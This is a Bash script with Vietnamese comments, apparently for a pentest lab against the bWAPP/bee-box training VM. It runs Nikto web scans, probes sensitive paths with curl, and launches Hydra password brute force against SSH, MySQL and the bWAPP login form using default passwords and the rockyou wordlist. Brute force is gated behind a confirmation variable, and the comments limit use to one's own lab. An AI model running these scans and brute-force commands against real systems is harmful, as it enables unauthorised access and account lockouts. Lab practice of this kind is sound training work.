#!/usr/bin/env bash
# =============================================================================
#  02_web_and_creds.sh — Nikto (web scan) + Hydra (credential attack)
# -----------------------------------------------------------------------------
#  Cách dùng:
#     chmod +x 02_web_and_creds.sh
#     ./02_web_and_creds.sh 192.168.91.130
#
#  Brute-force mặc định TẮT. Bật có chủ đích:
#     CONFIRM_BRUTE=YES BRUTE=ssh ./02_web_and_creds.sh 192.168.91.130
#     CONFIRM_BRUTE=YES BRUTE=mysql ./02_web_and_creds.sh 192.168.91.130
#     CONFIRM_BRUTE=YES BRUTE=http  ./02_web_and_creds.sh 192.168.91.130
#
#  Chỉ chạy trên lab của bạn. Hydra có thể khoá tài khoản / làm chậm dịch vụ.
# =============================================================================
set -uo pipefail

TARGET="${1:-192.168.91.130}"
STAMP="$(date +%Y%m%d-%H%M%S)"
OUTDIR="loot/web_${STAMP}"
BRUTE="${BRUTE:-none}"
WL="${WL:-/usr/share/wordlists/rockyou.txt}"

RED=$'\e[31m'; GRN=$'\e[32m'; YEL=$'\e[33m'; CYA=$'\e[36m'; NC=$'\e[0m'

banner() {
  printf '\n%s----------------------------------------------------------------%s\n' "$CYA" "$NC"
  printf '%s  %s%s\n' "$CYA" "$*" "$NC"
  printf '%s----------------------------------------------------------------%s\n' "$CYA" "$NC"
}

mkdir -p "$OUTDIR"

echo "${GRN}[+] Target : ${TARGET}${NC}"
echo "${GRN}[+] Output : ${OUTDIR}${NC}"
echo "${GRN}[+] Brute  : ${BRUTE}${NC}"

# -----------------------------------------------------------------------------
#  1. NIKTO — web server / cấu hình sai / file mặc định
# -----------------------------------------------------------------------------
if command -v nikto >/dev/null 2>&1; then
  banner "NIKTO :: HTTP"
  nikto -h "http://${TARGET}" -Tuning 123bde -Cgidirs all \
        -maxtime 15m -o "${OUTDIR}/nikto_http.txt" -Format txt \
        2>&1 | tee "${OUTDIR}/nikto_http.log"

  banner "NIKTO :: HTTPS"
  nikto -h "https://${TARGET}" -ssl -Tuning 123bde \
        -maxtime 10m -o "${OUTDIR}/nikto_https.txt" -Format txt \
        2>&1 | tee "${OUTDIR}/nikto_https.log"
else
  echo "${YEL}[!] Không có nikto: sudo apt install -y nikto${NC}"
fi

# -----------------------------------------------------------------------------
#  2. Kiểm tra nhanh vài path đặc trưng của bWAPP/bee-box (bằng curl)
# -----------------------------------------------------------------------------
banner "HTTP PROBE (curl)"
for p in "/" "/bWAPP/" "/bWAPP/login.php" "/phpmyadmin/" "/server-status" \
         "/robots.txt" "/.git/HEAD" "/phpinfo.php"; do
  code="$(curl -s -o /dev/null -k -m 5 -w '%{http_code}' "http://${TARGET}${p}")"
  printf '  %-28s -> %s\n' "$p" "$code" | tee -a "${OUTDIR}/http_probe.txt"
done

# -----------------------------------------------------------------------------
#  3. HYDRA — chỉ khi được cho phép rõ ràng
# -----------------------------------------------------------------------------
if [[ "$BRUTE" == "none" ]]; then
  banner "HYDRA — BỎ QUA"
  echo "  Bật khi thật sự cần:"
  echo "    CONFIRM_BRUTE=YES BRUTE=ssh   $0 $TARGET"
  echo "    CONFIRM_BRUTE=YES BRUTE=mysql $0 $TARGET"
  echo "    CONFIRM_BRUTE=YES BRUTE=http  $0 $TARGET"
  exit 0
fi

if [[ "${CONFIRM_BRUTE:-NO}" != "YES" ]]; then
  echo "${RED}[x] Thiếu CONFIRM_BRUTE=YES — dừng để tránh chạy nhầm.${NC}"
  exit 2
fi

if [[ ! -r "$WL" ]]; then
  echo "${YEL}[!] Không đọc được wordlist: $WL${NC}"
  echo "    Kali: sudo gunzip /usr/share/wordlists/rockyou.txt.gz"
  echo "    Hoặc: WL=/usr/share/wordlists/fasttrack.txt $0 $TARGET"
  exit 3
fi

# Thử trước 10 mật khẩu "lab-default" cho nhanh
cat > "${OUTDIR}/quick_pass.txt" <<'EOF'
bug
bee
root
toor
password
admin
123456
bWAPP
letmein
qwerty
EOF

banner "HYDRA :: thử nhanh 10 mật khẩu lab-default"
hydra -l bee  -P "${OUTDIR}/quick_pass.txt" "ssh://${TARGET}"   -t 2 -f -V \
      2>&1 | tee "${OUTDIR}/hydra_ssh_quick.log"
hydra -l root -P "${OUTDIR}/quick_pass.txt" "ssh://${TARGET}"   -t 2 -f -V \
      2>&1 | tee -a "${OUTDIR}/hydra_ssh_quick.log"
hydra -l root -P "${OUTDIR}/quick_pass.txt" "mysql://${TARGET}" -t 2 -f -V \
      2>&1 | tee "${OUTDIR}/hydra_mysql_quick.log"

case "$BRUTE" in
  ssh)
    banner "HYDRA :: SSH wordlist đầy đủ"
    hydra -l bee -P "$WL" "ssh://${TARGET}" -t 4 -f -V \
          2>&1 | tee "${OUTDIR}/hydra_ssh_full.log"
    ;;
  mysql)
    banner "HYDRA :: MySQL wordlist đầy đủ"
    hydra -l root -P "$WL" "mysql://${TARGET}" -t 4 -f -V \
          2>&1 | tee "${OUTDIR}/hydra_mysql_full.log"
    ;;
  http)
    banner "HYDRA :: bWAPP login (POST form)"
    # Chuỗi cuối là dấu hiệu THẤT BẠI ("Invalid username or password")
    hydra -l bee -P "$WL" "$TARGET" \
      "http-post-form:/bWAPP/login.php:login=^USER^&password=^PASS^&security_level=0&form=submit:Invalid username or password" \
      -t 16 -f -V 2>&1 | tee "${OUTDIR}/hydra_bwapp.log"
    ;;
  *)
    echo "${RED}[x] BRUTE không hợp lệ: $BRUTE (ssh|mysql|http)${NC}"; exit 4
    ;;
esac

banner "XONG"
echo "Report: ${OUTDIR}"
echo "  nikto_http.txt / nikto_https.txt"
echo "  http_probe.txt"
echo "  hydra_*.log"
